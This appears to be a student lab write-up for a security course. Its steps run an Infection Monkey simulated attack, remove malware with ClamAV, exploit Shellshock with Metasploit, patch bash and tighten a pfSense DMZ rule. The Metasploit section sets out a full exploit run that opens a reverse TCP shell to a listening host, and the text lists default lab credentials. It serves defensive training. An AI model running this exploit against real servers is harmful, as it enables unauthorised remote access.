
# Introduction

- **Reconnaissance** is the initiation of the hacking process. Reconnaissance refers to the act of inspecting or exploring target systems. It may also be referred to as footprinting, discovery, research, or information gathering.  
- **Scanning** is the process of using various tools to confirm information learned during reconnaissance and to discover new details. Scanning is aimed at discovering live and active systems.  
- **Enumeration** is the process of discovering and identifying potential attack targets. The output of the Enumeration phase should include sufficient details about a potential target for determining whether it may be vulnerable to a specific exploitation.  
- **Attacking** is the execution of the attack. While this step seems to be the phase that attracts most of the hype, it is the briefest phase of the overall hacking process.  
- **Post-Attack Activity** occurs after a successful attack, when the hacker usually has breached the target’s security to gain some level of logical access. If the attack is unsuccessful, the attacker may instead revert to fallback attacks.

# Section 1

<u>Part 1 - Perform a Simulated Attack with Infection Monkey</u>

On the vWorkstation taskbar, **click** the **Chrome icon** to launch the Chrome web browser.

SS1
<img width="1890" height="875" alt="Screenshot 2025-09-13 180622" src="https://github.com/user-attachments/assets/72e1f774-b33b-45fb-a98f-7d3d6ea899c5" />

In the Chrome navigation bar, **type https://172.40.0.50:5000** and **press Enter** to access the Infection Monkey interface.

SS2
<img width="1897" height="861" alt="Screenshot 2025-09-13 180725" src="https://github.com/user-attachments/assets/c18b9278-43fb-40a1-b8ff-01e2c58e4611" />

On the Infection Monkey home page, **click** **Configure Monkey** to open the Monkey Configuration page.

SS3
<img width="1753" height="775" alt="Screenshot 2025-09-13 180824" src="https://github.com/user-attachments/assets/9a9912e7-373f-4d31-bda9-c8adf543b5f9" />

On the Monkey Configuration page, **click** the **Exploits tab** to view a list of exploits that Infection Monkey is able to perform.

SS4
<img width="1350" height="638" alt="Screenshot 2025-09-13 180857" src="https://github.com/user-attachments/assets/c768b6fe-03b1-4afa-a5e2-cde610f788ad" />

On the Monkey Configuration page, **click** the **Network** **tab** to view Infection Monkey’s network-related settings.

SS5
<img width="1337" height="637" alt="Screenshot 2025-09-13 180922" src="https://github.com/user-attachments/assets/cb0a0865-6bcb-40d8-b8e3-3f9e75e0b2da" />

On the Monkey Configuration page, **click** the **Monkey tab** to view the configuration options for post-breach activities.

SS6
<img width="1462" height="685" alt="Screenshot 2025-09-13 180953" src="https://github.com/user-attachments/assets/952482d2-cf64-435c-9632-45e242c57146" />

On the Monkey Configuration page, **click** the **Internal tab** to view the advanced configuration settings.

SS7
<img width="1553" height="687" alt="Screenshot 2025-09-13 181014" src="https://github.com/user-attachments/assets/782d8b9a-7378-423e-9eef-f5f58b8784eb" />

From the left-hand panel, **click Run Monkey** to display the run options for Infection Monkey.

SS8
<img width="1593" height="713" alt="Screenshot 2025-09-13 181041" src="https://github.com/user-attachments/assets/9b4a2212-5bf0-437f-b1ac-539a2ccd8f5c" />

On the Run Monkey page, **click** **Run on Monkey Island Server** to initiate the attack on the DMZ from the Monkey Island C&C server.

From the left-hand panel, **click Infection Map** to display the Monkey’s progress.

SS9
<img width="1851" height="698" alt="Screenshot 2025-09-13 181120" src="https://github.com/user-attachments/assets/4010c0d4-576d-4515-850f-b9955444149b" />

On the Infection Map page, **click** the **corporationtechs.com icon** to display more information about the Infection Monkey’s actions on that particular machine.

In the right-hand pane, **scroll down** to the **EXPLOIT TIMELINE** section.

*Scroll through the EXPLOIT TIMELINE to review the attempted exploits on the machine. Each item on the timeline shows the time the exploit was tried, which machine it was tried from, and the name of the exploit module. A red circle to the left of the exploit indicates it was successful.*

In the left-hand pane, **click** **Security Reports** to access a detailed summary of Infection Monkey’s attack.

SS10
<img width="1892" height="691" alt="Screenshot 2025-09-13 181424" src="https://github.com/user-attachments/assets/0121415a-3437-4e79-94bb-70e029165231" />

On the Security report page, **scroll down** and **review** the **recommendations for the corporationtechs.com web server**.

SS11
<img width="1472" height="366" alt="Screenshot 2025-09-13 181528" src="https://github.com/user-attachments/assets/6bdd0c30-01e2-4234-9e8d-2b9504bbbfc7" />

On the Security report page, **click** the **Att&ck report** tab to view the Att&ck techniques matrix.

In the Att&ck report tab, **click** the **_Remote file copy_ square** to learn more about the related actions taken performed.

SS12
<img width="1512" height="628" alt="Screenshot 2025-09-13 181629" src="https://github.com/user-attachments/assets/d6e5d6b3-ff98-4ed1-bac5-500ecf0a7e08" />

<u>Part 2 - Use Antivirus Software to Remove Malicious Files</u>

On the Lab View toolbar, **select TargetLinux01** from the Virtual Machine menu to connect to the TargetLinux01 system.

*TargetLinux01 is a web server that hosts the corporationtechs.com website*

From the Application bar, **click** the **Terminal icon** to open the Terminal client.

At the command prompt, **type clamscan -h** and **press Enter** to display the help manual for ClamAV.

```bash
clamscan -h
```

At the command prompt, **type clamscan -r ./** and **press Enter** to run an antivirus scan.

SS13
<img width="920" height="687" alt="Screenshot 2025-09-13 181925" src="https://github.com/user-attachments/assets/cdc133cb-6891-4e16-984b-9b775b7d185d" />

*When the scan is complete, the Scan summary will indicate that there are two infected files. However, you would need to review the entire output to identify names and locations of the infected files. In the next step, you will a second scan and add an option that will prevent un-infected files from being reported*

At the command prompt, **type clamscan -ri ./** and **press Enter** to run a recursive scan of the entire computer (**r**), identifying only infecting files (**i**).

SS14
<img width="882" height="120" alt="Screenshot 2025-09-13 182021" src="https://github.com/user-attachments/assets/44ced3c1-f0f2-4bbb-b129-a2b29d1dc185" />

SS15
<img width="580" height="243" alt="Screenshot 2025-09-13 182108" src="https://github.com/user-attachments/assets/f0a65362-e9b7-4d54-b829-e601d5c9b6e7" />

At the command prompt, **type cd ~/** and **press Enter** to ensure you are at the user’s home directory.

At the command prompt, **type mkdir VIRUS** and **press Enter** to create a directory named VIRUS

At the command prompt, **type ls -l** and **press Enter** to confirm that the VIRUS directory exists.

SS16
<img width="1227" height="732" alt="Screenshot 2025-09-13 182230" src="https://github.com/user-attachments/assets/cb9289f4-f62f-47a3-9eeb-b45902048ca5" />

At the command prompt, **type clamscan -ri --move=/home/user/VIRUS ./** and **press Enter** to run a recursive scan of the entire computer (**r**), identifying only infecting files (**i**), and place all found into the VIRUS directory (**--move**).

SS17
<img width="873" height="142" alt="Screenshot 2025-09-13 182320" src="https://github.com/user-attachments/assets/c52a8a4b-5fe8-4d0c-9f74-726123a9115b" />

SS18
<img width="817" height="258" alt="Screenshot 2025-09-13 182351" src="https://github.com/user-attachments/assets/06161b33-2331-4239-8edd-f99346c6f231" />

At the command prompt, **type ls ./Music** and **press Enter** to confirm that the Music directory is now empty.

At the command prompt, **type ls ./VIRUS** and **press Enter** to confirm that the VIRUS directory now contains the two infected files.

SS19
<img width="578" height="106" alt="Screenshot 2025-09-13 182454" src="https://github.com/user-attachments/assets/3661fcc1-bf17-4e4e-9a2d-7ce65348e6c2" />

# Section 2

<u>Part 1 - Exploit a Vulnerable Web Server with Metasploit</u>

**Connect** to the **AttackLinux01 machine** and **sign in** using the following credentials:

```bash
Username: root
Password: toor
```

On the AttackLinxu01 menu bar, **click** the **Activities menu**, then **click** the **Metasploit icon** to open the Metasploit framework.

SS20
<img width="1282" height="723" alt="Screenshot 2025-09-13 182719" src="https://github.com/user-attachments/assets/8787da25-1f86-46ef-8078-a407782f18df" />

*This shortcut will open a Terminal window, initialize the Metasploit database, and invoke the msfconsole, from which you will configure and launch your exploit.*

At the msf5 prompt, **execute search shellshock** to query the msf database for all available exploits concerning shellshock.

```msf5
search shellshock
```

At the msf5 prompt, **execute use 5** to select the apache_mod_cgi_bash_env_exec as your exploit module of choice.

SS21
<img width="1130" height="663" alt="Screenshot 2025-09-13 182840" src="https://github.com/user-attachments/assets/26416379-44ee-4b6c-b449-4687c6ea2841" />

SS22
<img width="1056" height="112" alt="Screenshot 2025-09-13 182932" src="https://github.com/user-attachments/assets/7fad9969-2756-4b51-93c1-627c9757a63a" />

At the msf5 prompt, **execute info** to display information about the Shellshock vulnerability.

*The info command will provide additional information, as well as hyper-linked references, about the selected exploit.*

At the msf5 prompt, **execute show options** to display the various parameters for the execution.

SS23
<img width="1362" height="756" alt="Screenshot 2025-09-13 183035" src="https://github.com/user-attachments/assets/3d0d60b6-dfea-4c41-b052-935aabd24e68" />

There are three parameters required for this exploit:  
- remote host (RHOST)
- listening host (LHOST)
- path to the CGI script to be run (TARGETURI)

At the msf5 prompt, **execute set RHOST 172.40.0.20** to set the remote host parameter.

SS24
<img width="1062" height="137" alt="Screenshot 2025-09-13 183142" src="https://github.com/user-attachments/assets/071d6eff-9694-4f4a-8813-35ebb4af78f7" />

At the msf5 prompt, **execute set LHOST 10.0.1.3** to set the listening host.

SS25
<img width="890" height="77" alt="Screenshot 2025-09-13 183222" src="https://github.com/user-attachments/assets/736b1e2d-adb8-4307-98eb-ebd36fcbf112" />

At the msf5 prompt, **execute set TARGETURI cgi-bin/test-cgi.sh** to set the target URI (Uniform Resource Identifier).

SS26
<img width="1072" height="90" alt="Screenshot 2025-09-13 183258" src="https://github.com/user-attachments/assets/0155c648-da9c-44ad-9b35-fe91f0c8477e" />

*The TargetURI is / (the root directory) by default. Information on the location of the CGI script in the web server’s file structure would typically be gained in advance of the attack by performing reconnaissance on the target. In this case, you have discovered the script is called test-cgi.sh, and is located in the cgi-bin directory.*

At the msf5 prompt, **execute show options** and to verify your new settings.

SS27
<img width="1187" height="742" alt="Screenshot 2025-09-13 183404" src="https://github.com/user-attachments/assets/7c6abef6-27c3-4bd0-832a-d3932b67712a" />

At the msf5 prompt, **execute show payloads** to determine the available payload within the Metasploit Framework.

*A payload consists of code that will run on the server once a successful exploit has been achieved. It will dictate what actions you can perform on your newly exploited machine.*

At the msf5 prompt, **execute use 26** to select the linux/x86/shell/reverse_tcp payload.

SS28
<img width="1223" height="715" alt="Screenshot 2025-09-13 183513" src="https://github.com/user-attachments/assets/50052365-62d8-4fa2-a756-bfa2cd58a868" />

Once the machine has been exploited, this payload will establish a reverse shell connection to the listening host over the TCP protocol.

Optionally, you may set a payload explicitly using the set PAYLOAD <path/payloadname> command. This would be desirable if you have created a custom payload for the attack, or require one that is not listed. For example, all of the payloads here are specific to x86 architecture, meaning they are intended for 32-bit operating systems. To use the 64-bit version, you would type _set PAYLOAD linux/x64/shell/reverse_tcp_ instead (assuming such a module exists).

The target machine is running a 64-bit operating system; however, in this case, the architecture will not affect the success of the payload execution, so you will stick with the x86 version.

At the msf5 prompt, **execute check** to gauge the readiness of the exploit, as well as the vulnerability of the target machine.

SS29
<img width="742" height="105" alt="Screenshot 2025-09-13 183621" src="https://github.com/user-attachments/assets/0e22dfce-9087-4fb6-9d9f-c46e48c57734" />

At the msf5 prompt, **execute exploit** to initiate the exploit using the parameter values you configured, and the payload you selected.

SS30
<img width="1127" height="168" alt="Screenshot 2025-09-13 183644" src="https://github.com/user-attachments/assets/b5b09850-e255-4897-af06-763aea8a66de" />

Meterpreter is the interactive shell established by your shell/reverse_tcp payload, and it should have launched from the directory you specified for the test-cgi.sh file.

At the Meterpreter prompt, **execute ls** to list the contents of the current directory.

SS31
<img width="1116" height="230" alt="Screenshot 2025-09-13 183720" src="https://github.com/user-attachments/assets/9c6cbd72-0c32-493e-8004-738aefd3a75c" />

At the Meterpreter prompt, **execute exit** to kill the shell connection and return to the msfconsole.

Keep the Terminal window open, as you will use it in the next part to verify your patch on the corporationtechs.com web server.

<u>Part 2 - Patch the Exploited System</u>

**Connect** to the **TargetLinux01 machine**.

**Open** a new **Terminal window**.

At the command prompt, **execute bash –version** to display the currently installed version of bash.

SS32
<img width="1112" height="177" alt="Screenshot 2025-09-13 183913" src="https://github.com/user-attachments/assets/80c9d9eb-e601-42e5-8aeb-43411a178ba4" />

At the command prompt, **execute cd Downloads** to navigate to the /home/user/Downloads director

At the command prompt, **execute ls** to confirm a Debian package file (.deb) for Bash exists in the Downloads directory.

SS33
<img width="850" height="117" alt="Screenshot 2025-09-13 183953" src="https://github.com/user-attachments/assets/35f37b97-6e72-4d05-9a73-156c3afef50e" />

At the command prompt, **execute sudo dpkg -i bash_5.0-6ubuntu1_amd64.deb** and **press** **Enter** to install (**-i**) the bash package using the Debian Package Manager (**dpkg**).

Using the sudo command invokes the super user prompt at the command line. When prompted for a password, use the following: **P@ssw0rd!**

SS34
<img width="1055" height="267" alt="Screenshot 2025-09-13 184100" src="https://github.com/user-attachments/assets/762154ae-e7b1-4b45-bc5f-4bf2f10365b8" />

**Execute the command** to view the currently installed version of Bash.

SS35
<img width="980" height="185" alt="Screenshot 2025-09-13 184151" src="https://github.com/user-attachments/assets/e59f1ef8-0438-4db6-bb5d-2a2bc82d9b68" />

**Connect** to the **AttackLinux01** machine.

At the msf5 prompt, **execute check** to determine if the target machine is still vulnerable to ShellShock.

SS36
<img width="790" height="88" alt="Screenshot 2025-09-13 184221" src="https://github.com/user-attachments/assets/a574f791-a561-4bcd-9763-1be8ccec702f" />

At the msf5 prompt, **execute exploit** to re-attempt the ShellShock exploit on the target machine

SS37
<img width="843" height="143" alt="Screenshot 2025-09-13 184255" src="https://github.com/user-attachments/assets/a7f40a8f-2eb0-4216-8c71-b16dde2dffed" />

# Section 3

<u>Part 1 - Run an Antivirus Scan on the vWorkstation</u>

*Your direct supervisor is concerned with vulnerabilities with the vWorkstation on the internal network. It has been determined through log analysis that the machine has been accessed remotely by non-authorized personnel. You recall from your vulnerability scanning and exploit attempt through Infection Monkey that the vWorkstation was also compromised and a malicious file was copied to it from Monkey Island.*

On the vWorkstation, access the Infection Monkey web interface (172.40.0.50:5000) and inspect the Monkey Configuration to identify the location of the file that was remotely copied to the vWorkstation.

```cmd
C:\Users\Administrator\Pictures\eicar.com
```

SS38
<img width="1735" height="718" alt="Screenshot 2025-09-13 184600" src="https://github.com/user-attachments/assets/59a22ab7-4039-4296-b23d-e20cbc842a8e" />

Using Windows Virus and Threat Protection, execute a Custom scan on the folder containing the file identified above. Use the Internet as necessary to research how to perform this action.

SS39
<img width="776" height="303" alt="Screenshot 2025-09-13 184717" src="https://github.com/user-attachments/assets/210edbcc-b6ab-4aa2-8cba-f69c42a7f5f1" />

SS40
<img width="1877" height="773" alt="Screenshot 2025-09-13 184813" src="https://github.com/user-attachments/assets/f72a0db0-470a-4291-9e22-d9862c60ba61" />

SS41
<img width="1198" height="633" alt="Screenshot 2025-09-13 184847" src="https://github.com/user-attachments/assets/30fa30eb-2c82-46e1-938a-7039f527b08c" />

<u>Part 2 - Harden the Network Perimeter</u>

*Now it is time for you to address a larger problem: unwarranted access from the DMZ to the internal network. It is not unusual for machines on the internal network to have access to the DMZ hosts, as the machines hosted in a de-militarized zone often need to be accessed by both internal and external users. However, it is unusual (and extremely poor security posture) to allow inbound access to the internal network from the DMZ. The DMZ is intended to provide residence to internal hosts that need to be accessed by external users, but without compromising the security of the internal network. By allowing access from the DMZ to the internal network, you render it pointless, now providing hackers the ability to easily pivot into the internal network it was constructed to protect. You know the DMZ in this network is defined at the edge firewall, which you recall is a pfSense firewall appliance located at 172.30.0.1. pfSense has a web interface (called the WebGUI) that allows you to configure it in the browser by simply navigating to that IP address. Furthermore, you know that the access from the DMZ is governed by rules on the DMZ interface on the pfSense machine. If you could just log in to the pfSense webGUI and remove the permissive rule on the DMZ interface, you should be able to quickly remedy the segmentation problem and harden the network’s security posture.*

From the vWorkstation, access the pfSense WebGUI from the Firefox web browser at http://172.30.0.1. You can log in using the following credentials:

```cmd
Username: admin
Password: pfsense
```

SS42
<img width="1890" height="870" alt="Screenshot 2025-09-13 185044" src="https://github.com/user-attachments/assets/534a0d0b-c666-489e-b070-cd728de9b2b6" />


Once you have access, locate the offending firewall rule on the DMZ interface, remove it, and apply your changes. Use the Internet as necessary to determine how to remove firewall rules from an interface in pfSense.

SS43

<img width="1777" height="702" alt="Screenshot 2025-09-13 185321" src="https://github.com/user-attachments/assets/ade6981d-c84d-43ee-be65-f9157300b579" />
